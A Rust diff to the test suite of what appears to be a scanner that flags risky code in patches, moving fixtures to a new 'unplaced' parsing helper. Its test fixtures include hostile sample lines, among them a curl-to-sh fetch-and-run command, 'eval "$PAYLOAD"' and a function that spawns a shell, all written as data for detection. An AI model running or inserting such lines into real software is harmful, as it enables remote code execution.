@@ -3842,6 +3842,7 @@ pub fn signal_sides(signal: EvidenceSignal) -> Vec<Side> {
 mod tests {
     use super::*;
     use crate::lexical::{ScanState, code_view, code_views};
+    use crate::unplaced::unplaced;
     use deep_diff_forge_patch::parse;
     use std::fmt::Write as _;
 
@@ -4418,7 +4419,9 @@ mod tests {
                 ("src/a.ts", "catch(".repeat(33_334)),
                 ("src/a.ts", "catch (".repeat(28_572)),
             ] {
-                let patch = format!("--- a/{path}\n+++ b/{path}\n@@ -2,0 +3,1 @@\n+{line}\n");
+                // A blank line of context on each side, as Git writes it (0.10.0: the parser refuses a
+                // hunk with no context past line 1; was `@@ -2,0 +3,1 @@`).
+                let patch = format!("--- a/{path}\n+++ b/{path}\n@@ -2,2 +2,3 @@\n \n+{line}\n \n");
                 let files = parse(&patch).unwrap();
                 let start = ScanClock::start();
                 let ranked = crate::rank(&files);
@@ -4460,7 +4463,7 @@ mod tests {
                 writeln!(patch, "+{line}").unwrap();
             }
             let read = || {
-                let files = parse(&patch).unwrap();
+                let files = unplaced(&patch);
                 let items: Vec<(S, Side, u32, bool)> = file_evidence(&files[0])
                     .iter()
                     .map(|e| (e.signal, e.side, e.line, e.released))
@@ -4927,7 +4930,10 @@ mod tests {
                     } else {
                         format!("{}{trigger}", "a".repeat(SIZE - trigger.len()))
                     };
-                    let patch = format!("--- a/{name}\n+++ b/{name}\n@@ -2,0 +3,1 @@\n+{line}\n");
+                    // A blank line of context on each side, as Git writes it (0.10.0; was
+                    // `@@ -2,0 +3,1 @@`).
+                    let patch =
+                        format!("--- a/{name}\n+++ b/{name}\n@@ -2,2 +2,3 @@\n \n+{line}\n \n");
                     let _ = said.send((item.clone(), None));
                     let files = parse(&patch).unwrap();
                     let start = ScanClock::start();
@@ -11100,6 +11106,11 @@ mod tests {
         found(&parse(patch).unwrap().remove(0))
     }
 
+    /// [`found_in`] on the file built by [`unplaced`] (hunks the parser refuses for their place).
+    fn found_unplaced(patch: &str) -> Vec<Item> {
+        found(&unplaced(patch).remove(0))
+    }
+
     /// The spawn the placement tests hide: one line of Rust that starts a process.
     const SPAWN: &str = r#"pub fn evil() { std::process::Command::new("sh").status().ok(); }"#;
 
@@ -11195,10 +11206,9 @@ mod tests {
     #[test]
     fn a_created_file_starts_at_its_first_hunk_whatever_the_headers_say() {
         let created = |first: &str, second: &str| {
-            parse(&format!(
+            unplaced(&format!(
                 "diff --git a/src/g.rs b/src/g.rs\nnew file mode 100644\n--- /dev/null\n+++ b/src/g.rs\n{first}\n+#!/usr/bin/env run /*\n+fn a() {{}}\n{second}\n+{SPAWN}\n"
             ))
-            .unwrap()
             .remove(0)
         };
         for (first, second) in [
@@ -11259,9 +11269,7 @@ mod tests {
             top: false,
         };
         let existing = |hunks: &str| {
-            parse(&format!("--- a/src/lib.rs\n+++ b/src/lib.rs\n{hunks}"))
-                .unwrap()
-                .remove(0)
+            unplaced(&format!("--- a/src/lib.rs\n+++ b/src/lib.rs\n{hunks}")).remove(0)
         };
         // a hunk that ends the file, and a hunk of added lines: each alone, and the two as
         // one text, whatever the position the second gives
@@ -11346,10 +11354,9 @@ mod tests {
     /// result. Both readings are made, and what either finds is found.
     #[test]
     fn a_join_takes_no_reading_away() {
-        let file = parse(
+        let file = unplaced(
             "--- a/src/a.rs\n+++ b/src/a.rs\n@@ -5,0 +6,2 @@ pub fn a() -> u32 {\n+    let x = Some(1); /* note\n+    let y = 2;\n@@ -20,0 +23,2 @@ pub fn b() -> u32 {\n+    std::process::Command::new(\"sh\").status().ok();\n+    let z = q.unwrap();\n",
         )
-        .unwrap()
         .remove(0);
         let text = |hunks: &[usize]| Text {
             hunks: hunks.to_vec(),
@@ -11367,7 +11374,7 @@ mod tests {
         // `--unidiff-zero` puts it after line 1 (plain `git apply` refuses it unless the
         // file is empty). Here line 1 opens a comment, and the added line is a call.
         assert_eq!(
-            found_in(&format!(
+            found_unplaced(&format!(
                 "--- a/src/a.rs\n+++ b/src/a.rs\n@@ -1,0 +2,1 @@\n+// */ {SPAWN} /*\n"
             )),
             [(S::ProcessSpawn, Basis::Lexical, 2)]
@@ -11375,7 +11382,7 @@ mod tests {
         // And it loses nothing the top of a file has: on an empty file plain `git apply`
         // puts it at line 1, where a first line that is a shebang opens nothing.
         assert_eq!(
-            found_in(&format!(
+            found_unplaced(&format!(
                 "--- a/src/a.rs\n+++ b/src/a.rs\n@@ -1,0 +1,2 @@\n+#!/usr/bin/env run /*\n+{SPAWN}\n"
             )),
             [(S::ProcessSpawn, Basis::Lexical, 2)]
@@ -11463,7 +11470,7 @@ mod tests {
                 old += context;
                 new += part.len() + context;
             }
-            let file = parse(&patch).unwrap().remove(0);
+            let file = unplaced(&patch).remove(0);
             let kind = FileKind::readings(&file).remove(0);
             let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
             let hunks = &file.patch_twin.hunks;
@@ -11532,10 +11539,9 @@ mod tests {
     /// file read as one text. The first call both find.
     #[test]
     fn an_item_only_a_join_finds_is_not_one_the_release_reported() {
-        let file = parse(
+        let file = unplaced(
             "diff --git a/tool.py b/tool.py\nnew file mode 100644\n--- /dev/null\n+++ b/tool.py\n@@ -0,0 +1,2 @@\n+os.system(a)\n+NOTE = \"\"\"\n@@ -2,0 +3,2 @@\n+text \"\"\"\n+os.system(b)\n",
         )
-        .unwrap()
         .remove(0);
         let found: Vec<(S, u32, bool)> = file_evidence(&file)
             .iter()
@@ -11656,7 +11662,7 @@ mod tests {
         let (mut cut_short, mut pushed, mut placed) = (0, 0, 0);
         for case in 0..1200 {
             let patch = patch_with_many_items(case, &mut next);
-            let file = parse(&patch).unwrap().remove(0);
+            let file = unplaced(&patch).remove(0);
             let key = |item: &Evidence| (item.hunk, item.side, item.signal, item.line);
             let all = file_evidence(&file);
             let ranked = crate::rank::RankedFile::scored(&file);
@@ -11724,7 +11730,7 @@ mod tests {
     #[test]
     fn a_file_created_as_several_hunks_is_read_as_the_file_it_is() {
         let created = |hunks: &str| {
-            found_in(&format!(
+            found_unplaced(&format!(
                 "diff --git a/src/lib.rs b/src/lib.rs\nnew file mode 100644\n--- /dev/null\n+++ b/src/lib.rs\n{hunks}"
             ))
         };
@@ -11796,10 +11802,9 @@ mod tests {
     fn joined_hunks_of_another_language_are_read_together_and_alone() {
         let created = |second: &str| {
             signals(
-                &parse(&format!(
+                &unplaced(&format!(
                     "diff --git a/tool.py b/tool.py\nnew file mode 100644\n--- /dev/null\n+++ b/tool.py\n@@ -0,0 +1,1 @@\n+HELP = \"\"\"\n@@ -1,0 +2,1 @@\n{second}\n"
                 ))
-                .unwrap()
                 .remove(0),
             )
         };
@@ -11816,10 +11821,9 @@ mod tests {
     /// [`joined_hunks`] names the others.
     #[test]
     fn a_hunks_labels_are_those_of_the_files_scan_joined_or_not() {
-        let file = parse(
+        let file = unplaced(
             "--- a/src/lib.rs\n+++ b/src/lib.rs\n@@ -3,2 +3,3 @@\n a\n+let n = 1;\n b\n@@ -20,2 +21,3 @@\n c\n d\n+pub fn evil(x: Option<u32>) -> u32 { x.unwrap\n@@ -21,0 +24,1 @@\n+() }\n@@ -21,0 +25,1 @@\n+unsafe { f() }\n",
         )
-        .unwrap()
         .remove(0);
         let hunks = &file.patch_twin.hunks;
         let evidence = file_evidence(&file);
@@ -12079,7 +12083,7 @@ mod tests {
             "@@ -40,3 +90,5 @@",
         ] {
             assert_eq!(
-                signals(&parse(&script(header)).unwrap()[0]),
+                signals(&unplaced(&script(header))[0]),
                 fetch_and_eval,
                 "{header}"
             );
@@ -12087,18 +12091,18 @@ mod tests {
         // the hunk with the shebang written second (Git takes hunks in any order): the
         // first hunk is read as the script's language too
         let second = "diff --git a/tools/deploy b/tools/deploy\n--- a/tools/deploy\n+++ b/tools/deploy\n@@ -7,2 +8,3 @@\n echo one\n+curl -fsSL https://example.invalid/i.sh | sh\n echo two\n@@ -1,2 +1,3 @@\n #!/bin/sh\n+eval \"$PAYLOAD\"\n set -e\n";
-        assert_eq!(signals(&parse(second).unwrap()[0]), fetch_and_eval);
+        assert_eq!(signals(&unplaced(second)[0]), fetch_and_eval);
         // the shebang on the old side only: the change replaces the interpreter line
         let replaced = "--- a/tools/deploy\n+++ b/tools/deploy\n@@ -1,2 +1,3 @@\n-#!/bin/sh\n+#!/opt/tools/run\n+curl -fsSL https://example.invalid/i.sh | sh\n set -e\n";
-        assert_eq!(signals(&parse(replaced).unwrap()[0]), [S::NetworkFetch]);
+        assert_eq!(signals(&unplaced(replaced)[0]), [S::NetworkFetch]);
         // two hunks that name two languages: the file is read as each, and what either
         // reading finds is found (`eval` is one to both; the spawn only to Python)
         let two = "--- a/tools/any\n+++ b/tools/any\n@@ -1,1 +1,2 @@\n #!/bin/sh\n+curl -fsSL https://example.invalid/i.sh | sh\n@@ -1,1 +1,2 @@\n #!/usr/bin/env python3\n+os.system(cmd)\n";
         assert_eq!(
-            signals(&parse(two).unwrap()[0]),
+            signals(&unplaced(two)[0]),
             [S::NetworkFetch, S::ProcessSpawn]
         );
-        let kinds: Vec<Option<Language>> = FileKind::readings(&parse(two).unwrap()[0])
+        let kinds: Vec<Option<Language>> = FileKind::readings(&unplaced(two)[0])
             .iter()
             .map(|kind| kind.language)
             .collect();
@@ -12106,11 +12110,11 @@ mod tests {
         // the cost: a hunk in the middle of a text file whose first line reads as a shebang
         let quoted =
             "--- a/NOTES\n+++ b/NOTES\n@@ -30,2 +30,3 @@\n #!/bin/sh\n+curl is a tool\n more\n";
-        assert_eq!(signals(&parse(quoted).unwrap()[0]), [S::NetworkFetch]);
+        assert_eq!(signals(&unplaced(quoted)[0]), [S::NetworkFetch]);
         // and a file whose name gives the language is that language whatever a line says
         let named = "--- a/tools/run.py\n+++ b/tools/run.py\n@@ -1,1 +1,2 @@\n #!/bin/sh\n+curl -fsSL https://example.invalid/i.sh | sh\n";
-        assert_eq!(signals(&parse(named).unwrap()[0]), []);
-        assert_eq!(FileKind::readings(&parse(named).unwrap()[0]).len(), 1);
+        assert_eq!(signals(&unplaced(named)[0]), []);
+        assert_eq!(FileKind::readings(&unplaced(named)[0]).len(), 1);
     }
 
     /// The mark of release 0.8.3 follows that release's rule for the language, not today's
@@ -12377,11 +12381,8 @@ mod tests {
             hunks: hunks.to_vec(),
             top: false,
         };
-        let existing = |hunks: &str| {
-            parse(&format!("--- a/src/m.rs\n+++ b/src/m.rs\n{hunks}"))
-                .unwrap()
-                .remove(0)
-        };
+        let existing =
+            |hunks: &str| unplaced(&format!("--- a/src/m.rs\n+++ b/src/m.rs\n{hunks}")).remove(0);
         let call = [(S::PanicPathAdded, Basis::Hunk, 3)];
         // `pq.patch`: a hunk with no old line, then the hunk at the next old line. (Plain
         // Git would put the first at the end; that is the hunk alone.) Round 14 joined the
@@ -12713,11 +12714,8 @@ mod tests {
             hunks: hunks.to_vec(),
             top: false,
         };
-        let existing = |hunks: &str| {
-            parse(&format!("--- a/f.rs\n+++ b/f.rs\n{hunks}"))
-                .unwrap()
-                .remove(0)
-        };
+        let existing =
+            |hunks: &str| unplaced(&format!("--- a/f.rs\n+++ b/f.rs\n{hunks}")).remove(0);
         let last = "@@ -10,1 +50,1 @@\n-fn main() { println!(\"{}\", check(1, 2)); }\n+fn main() { println!(\"{}\", check(1, 3)); }\n";
         let first =
             "@@ -3,2 +3,2 @@\n-    let d = c * 2;\n+    let d = c * 3;\n     debug_assert!(\n";
@@ -12863,7 +12861,7 @@ mod tests {
                 }
                 let _ = writeln!(patch, "-old\n+{line}");
             }
-            parse(&patch).unwrap().remove(0)
+            unplaced(&patch).remove(0)
         };
         for (path, line) in [
             ("src/a.rs", "    let s = \"open; x.unwrap();"),
@@ -12886,10 +12884,9 @@ mod tests {
             );
         }
         // a hunk in several texts (the review's `decoy.patch` shape: three joined texts)
-        let several = parse(
+        let several = unplaced(
             "--- a/f.rs\n+++ b/f.rs\n@@ -4,0 +40,1 @@\n+// end\n@@ -3,2 +3,2 @@\n-    let d = c * 2;\n+    let d = c * 3;\n     debug_assert!(\n@@ -5,3 +30,3 @@\n-        a < b,\n+        true,\n         \"a must be below b\");\n     let e = d + 1;\n",
         )
-        .unwrap()
         .remove(0);
         assert_eq!(texts(&several).len(), 6);
         assert_eq!((longest(&several), peak(&several).0), (8, 8));
@@ -12903,10 +12900,9 @@ mod tests {
     /// 12: it is passed over, and the fourth, which says the same, is taken.
     #[test]
     fn the_end_of_the_run_a_hunk_begins_is_not_put_before_it() {
-        let file = parse(
+        let file = unplaced(
             "--- a/src/r.rs\n+++ b/src/r.rs\n@@ -10,2 +10,2 @@\n-a\n+b\n c\n@@ -12,1 +12,1 @@\n-d\n+e\n@@ -9,0 +90,1 @@\n+f\n@@ -10,2 +70,2 @@\n-g\n+h\n i\n",
         )
-        .unwrap()
         .remove(0);
         let runs: Vec<Vec<usize>> = joined_texts(&file)
             .into_iter()
@@ -12949,11 +12945,8 @@ mod tests {
             hunks: hunks.to_vec(),
             top,
         };
-        let existing = |hunks: &str| {
-            parse(&format!("--- a/m.rs\n+++ b/m.rs\n{hunks}"))
-                .unwrap()
-                .remove(0)
-        };
+        let existing =
+            |hunks: &str| unplaced(&format!("--- a/m.rs\n+++ b/m.rs\n{hunks}")).remove(0);
         // `twotop.patch`
         let twotop = existing(
             "@@ -0,0 +3,2 @@\n+    ()\n+}\n@@ -0,0 +1,2 @@\n+pub fn boom(opt: Option<u8>) -> u8 {\n+    opt.unwrap\n",
@@ -12993,10 +12986,9 @@ mod tests {
         // a declared miss, and `newtop-natural.patch` (Git's result has no call) a declared
         // false positive.
         let created = |hunks: &str| {
-            parse(&format!(
+            unplaced(&format!(
                 "diff --git a/m.rs b/m.rs\nnew file mode 100644\n--- /dev/null\n+++ b/m.rs\n{hunks}"
             ))
-            .unwrap()
             .remove(0)
         };
         let newtwotop = created(
@@ -13050,7 +13042,7 @@ mod tests {
                 let (at_old, at_new) = (number(), number());
                 let _ = write!(patch, "@@ -{at_old},{old} +{at_new},{new} @@\n{body}");
             }
-            let file = parse(&patch).unwrap().remove(0);
+            let file = unplaced(&patch).remove(0);
             let now = joined_texts(&file);
             let then = joins_of_round_14(&file);
             for run in &then {
@@ -13157,11 +13149,8 @@ mod tests {
     /// takes a writer who sets out to.
     #[test]
     fn a_construct_cut_by_hunks_that_nothing_joins_is_found_only_where_a_half_holds_it_whole() {
-        let existing = |hunks: &str| {
-            parse(&format!("--- a/cut.rs\n+++ b/cut.rs\n{hunks}"))
-                .unwrap()
-                .remove(0)
-        };
+        let existing =
+            |hunks: &str| unplaced(&format!("--- a/cut.rs\n+++ b/cut.rs\n{hunks}")).remove(0);
         let pair = |first: &str, second: &str, header: &str| {
             existing(&format!(
                 "@@ -1,2 +1,3 @@\n fn f(opt: Option<u32>) -> u32 {{\n+{first}\n \n{header}\n+{second}\n     a\n }}\n"
@@ -13290,10 +13279,9 @@ mod tests {
     /// independent review's `four-u3.patch`, plain `git diff`, IR12-L-1).
     #[test]
     fn an_ignore_with_arguments_is_a_skip_and_a_bare_ignore_at_the_end_is_not() {
-        let file = parse(
+        let file = unplaced(
             "--- a/tests/it.rs\n+++ b/tests/it.rs\n@@ -1,9 +1,11 @@\n #[test]\n+#[ignore(not_ready)]\n fn a() {\n     assert_eq!(1 + 1, 2);\n }\n \n #[test]\n+#[cfg_attr(all(), ignore(flaky))]\n fn d() {\n     assert_eq!(2 + 2, 4);\n }\n",
         )
-        .unwrap()
         .remove(0);
         assert_eq!(
             found(&file),
@@ -13302,34 +13290,30 @@ mod tests {
                 (S::TestSkipped, Basis::Lexical, 8)
             ]
         );
-        let cfgu0 = parse(
+        let cfgu0 = unplaced(
             "--- a/tests/slow.rs\n+++ b/tests/slow.rs\n@@ -2,2 +2,8 @@\n-#[should_panic(\n-    expected = \"a very long expected panic message that makes rustfmt wrap the attribute over lines\"\n+#[cfg_attr(\n+    any(\n+        target_os = \"windows\",\n+        target_os = \"macos\",\n+        target_arch = \"wasm32\",\n+        target_env = \"musl\"\n+    ),\n+    ignore\n",
         )
-        .unwrap()
         .remove(0);
         assert_eq!(found(&cfgu0), []);
         // Vesper, round 18 (VD3R18-M-1, `direct.rs` and `cfg.rs`, as `git diff -U0` wrote
         // them): in `discard! { … }` the attribute's opening parenthesis goes on as
         // `NOT_A_SKIP` and `)]`; it compiles and skips nothing
         for line in ["#[ignore(", "#[cfg_attr(all(), ignore("] {
-            let honest = parse(&format!(
+            let honest = unplaced(&format!(
                 "--- a/tests/d.rs\n+++ b/tests/d.rs\n@@ -5 +5 @@ fn main() {{\n-        #[allow(\n+        {line}\n"
             ))
-            .unwrap()
             .remove(0);
             assert_eq!(found(&honest), [], "{line}");
         }
-        let reason = parse(
+        let reason = unplaced(
             "--- a/tests/slow.rs\n+++ b/tests/slow.rs\n@@ -2,2 +2,8 @@\n-#[should_panic(\n-    expected = \"a very long expected panic message that makes rustfmt wrap the attribute over lines\"\n+#[cfg_attr(\n+    any(\n+        target_os = \"windows\",\n+        target_os = \"macos\",\n+        target_arch = \"wasm32\",\n+        target_env = \"musl\"\n+    ),\n+    ignore = \"slow on these platforms\"\n",
         )
-        .unwrap()
         .remove(0);
         assert_eq!(found(&reason), []);
         // with the `)]` in the hunk it is whole, and a skip
-        let reason = parse(
+        let reason = unplaced(
             "--- a/tests/slow.rs\n+++ b/tests/slow.rs\n@@ -1,4 +1,10 @@\n #[test]\n-#[should_panic(\n-    expected = \"a very long expected panic message that makes rustfmt wrap the attribute over lines\"\n+#[cfg_attr(\n+    any(\n+        target_os = \"windows\",\n+        target_os = \"macos\",\n+        target_arch = \"wasm32\",\n+        target_env = \"musl\"\n+    ),\n+    ignore = \"slow on these platforms\"\n )]\n",
         )
-        .unwrap()
         .remove(0);
         assert_eq!(found(&reason), [(S::TestSkipped, Basis::Hunk, 2)]);
     }
@@ -13355,10 +13339,9 @@ mod tests {
     /// refuses it, "src/n.rs: No such file or directory".)
     #[test]
     fn a_second_section_for_one_path_is_two_files_until_the_parser_refuses_it() {
-        let files = parse(
+        let files = unplaced(
             "diff --git a/src/n.rs b/src/n.rs\nnew file mode 100644\n--- /dev/null\n+++ b/src/n.rs\n@@ -0,0 +1,2 @@\n+pub fn f(opt: Option<u32>) -> u32 {\n+    let v = opt.unwrap\ndiff --git a/src/n.rs b/src/n.rs\n--- a/src/n.rs\n+++ b/src/n.rs\n@@ -9,0 +3,3 @@\n+    ();\n+    v\n+}\n",
-        )
-        .unwrap();
+        );
         assert_eq!(files.len(), 2);
         assert_eq!(
             (files[0].path.as_str(), files[1].path.as_str()),
@@ -13394,7 +13377,7 @@ mod tests {
                     new + 2
                 );
             }
-            let file = parse(&patch).unwrap().remove(0);
+            let file = unplaced(&patch).remove(0);
             let start = ScanClock::start();
             let texts = texts(&file);
             let spent = start.elapsed();
